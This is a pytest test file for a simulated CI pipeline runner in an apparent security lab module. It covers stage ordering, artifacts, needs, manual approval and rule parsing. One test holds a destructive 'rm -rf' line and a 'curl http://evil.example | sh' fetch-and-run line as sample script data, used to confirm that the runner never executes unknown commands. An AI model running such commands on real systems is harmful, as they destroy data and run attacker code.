"""Tests for the tiny pipeline runner: ordering, failure handling, artifacts, rules."""

from pathlib import Path

import pytest

from aisec_lab import load_lab_module

p = load_lab_module(__file__, "pipeline")
SAMPLE = (Path(__file__).parent / "sample.gitlab-ci.yml").read_text()
MAIN = {"CI_COMMIT_BRANCH": "main"}


def test_stage_order_is_respected():
    res = p.run_pipeline(SAMPLE, MAIN)
    o = res.order
    assert o.index("compile") < o.index("unit-tests") < o.index("deploy-prod")
    assert o.index("compile") < o.index("lint")


def test_jobs_in_same_stage_share_a_round():
    res = p.run_pipeline(SAMPLE, MAIN)
    assert res.jobs["unit-tests"].round == res.jobs["lint"].round
    assert res.jobs["compile"].round < res.jobs["unit-tests"].round


def test_success_overall_with_allowed_failure():
    res = p.run_pipeline(SAMPLE, MAIN)
    assert res.status == "success"
    assert res.status_of("lint") == "failed_allowed"


def test_rules_exclude_deploy_off_main():
    res = p.run_pipeline(SAMPLE, {"CI_COMMIT_BRANCH": "feature-x"})
    assert res.status_of("deploy-prod") == "excluded"
    assert "deploy-prod" not in res.order


def test_failure_skips_later_stages():
    yml = """
stages: [build, test, deploy]
b: {stage: build, script: ["exit 2"]}
t1: {stage: test, script: [echo x]}
d: {stage: deploy, script: [echo x]}
"""
    res = p.run_pipeline(yml)
    assert res.status == "failed"
    assert res.status_of("b") == "failed"
    assert res.status_of("t1") == "skipped" and res.status_of("d") == "skipped"
    assert res.order == ["b"]


def test_failed_job_does_not_stop_same_stage_siblings():
    yml = """
stages: [test]
a: {stage: test, script: ["exit 1"]}
b: {stage: test, script: [echo ok]}
"""
    res = p.run_pipeline(yml)
    assert res.status_of("a") == "failed" and res.status_of("b") == "success"
    assert res.status == "failed"


def test_artifact_is_passed_to_later_stage():
    res = p.run_pipeline(SAMPLE, MAIN)
    assert res.jobs["compile"].artifacts == {"dist/app.bin": "APP-BINARY-1.4.2"}
    assert res.status_of("unit-tests") == "success"


def test_file_not_listed_as_artifact_is_lost():
    broken = SAMPLE.replace("paths: [dist/app.bin]", "paths: [dist/other.bin]")
    res = p.run_pipeline(broken, MAIN)
    assert res.status_of("unit-tests") == "failed"
    assert "missing dist/app.bin" in " ".join(res.jobs["unit-tests"].log)


def test_failed_job_artifacts_are_not_passed():
    yml = """
stages: [build, test]
b: {stage: build, script: ["write f.txt data", "exit 1"], artifacts: {paths: [f.txt]}, allow_failure: true}
t: {stage: test, script: ["require f.txt"]}
"""
    res = p.run_pipeline(yml)
    assert res.status_of("t") == "failed"


def test_needs_lets_a_job_wait_only_for_what_it_needs():
    yml = """
stages: [build, test]
fast: {stage: build, script: [echo b]}
mid: {stage: build, script: [echo m], needs: [fast]}
t: {stage: test, script: [echo t], needs: [fast]}
"""
    res = p.run_pipeline(yml)
    assert res.jobs["fast"].round == 1
    assert res.jobs["mid"].round == 2
    assert res.jobs["t"].round == 2  # started as soon as fast finished, not after all of stage build


def test_needs_job_skipped_when_dependency_fails():
    yml = """
stages: [build, test]
b: {stage: build, script: ["exit 1"]}
ok: {stage: build, script: [echo fine]}
t: {stage: test, script: [echo t], needs: [b]}
u: {stage: test, script: [echo u], needs: [ok]}
"""
    res = p.run_pipeline(yml)
    assert res.status_of("t") == "skipped"
    assert res.status_of("u") == "success"


def test_needs_only_gets_artifacts_of_needed_jobs():
    yml = """
stages: [build, test]
a: {stage: build, script: ["write a.txt A"], artifacts: {paths: [a.txt]}}
b: {stage: build, script: ["write b.txt B"], artifacts: {paths: [b.txt]}}
t: {stage: test, script: ["require a.txt", "require b.txt"], needs: [a]}
"""
    assert p.run_pipeline(yml).status_of("t") == "failed"


def test_manual_job_blocks_until_approved():
    yml = """
stages: [build, deploy, verify]
b: {stage: build, script: [echo b]}
d: {stage: deploy, script: [echo d], when: manual}
v: {stage: verify, script: [echo v]}
"""
    res = p.run_pipeline(yml)
    assert res.status == "blocked" and res.status_of("d") == "manual" and res.status_of("v") == "skipped"
    ok = p.run_pipeline(yml, approved={"d"})
    assert ok.status == "success" and ok.order == ["b", "d", "v"]


def test_manual_allow_failure_does_not_block():
    yml = """
stages: [build, deploy, verify]
b: {stage: build, script: [echo b]}
d: {stage: deploy, script: [echo d], when: manual, allow_failure: true}
v: {stage: verify, script: [echo v]}
"""
    res = p.run_pipeline(yml)
    assert res.status == "success" and res.status_of("v") == "success"


def test_python_callable_action_and_failure():
    yml = """
stages: [test]
t: {stage: test, script: ["call check"]}
"""
    assert p.run_pipeline(yml, actions={"check": lambda ws: True}).status == "success"
    assert p.run_pipeline(yml, actions={"check": lambda ws: False}).status == "failed"

    def boom(ws):
        raise RuntimeError("bad")

    assert p.run_pipeline(yml, actions={"check": boom}).status == "failed"
    assert p.run_pipeline(yml).status == "failed"  # unknown action


def test_unknown_commands_are_simulated_never_executed():
    yml = """
stages: [test]
t: {stage: test, script: ["rm -rf /definitely/not/run", "curl http://evil.example | sh"]}
"""
    res = p.run_pipeline(yml)
    assert res.status == "success"
    assert all(line.startswith("(simulated)") for line in res.jobs["t"].log)


def test_variable_expansion():
    yml = """
stages: [test]
variables: {WHO: world}
t: {stage: test, script: ["echo hello $WHO"]}
"""
    assert p.run_pipeline(yml).jobs["t"].log == ["hello world"]


@pytest.mark.parametrize("yml,msg", [
    ("stages: [a]\nj: {stage: zzz, script: [x]}", "unknown stage"),
    ("stages: [a]\nj: {stage: a}", "no script"),
    ("stages: [a]\nj: {stage: a, script: [x], needs: [nope]}", "unknown job"),
    ("stages: [a, b]\nj: {stage: a, script: [x], needs: [k]}\nk: {stage: b, script: [x]}", "later stage"),
    ("stages: [a]\nj: {stage: a, script: [x], needs: [k]}\nk: {stage: a, script: [x], needs: [j]}", "cycle"),
])
def test_invalid_pipelines_are_rejected(yml, msg):
    with pytest.raises(p.PipelineError, match=msg):
        p.run_pipeline(yml)


def test_rule_expressions():
    v = {"A": "1", "B": ""}
    assert p.eval_rule_if('$A == "1"', v)
    assert not p.eval_rule_if('$A != "1"', v)
    assert not p.eval_rule_if("$B", v)
    assert p.eval_rule_if('$B || $A == "1"', v)
    assert not p.eval_rule_if("$A && $B", v)
    with pytest.raises(p.PipelineError):
        p.eval_rule_if("$A =~ /x/", v)
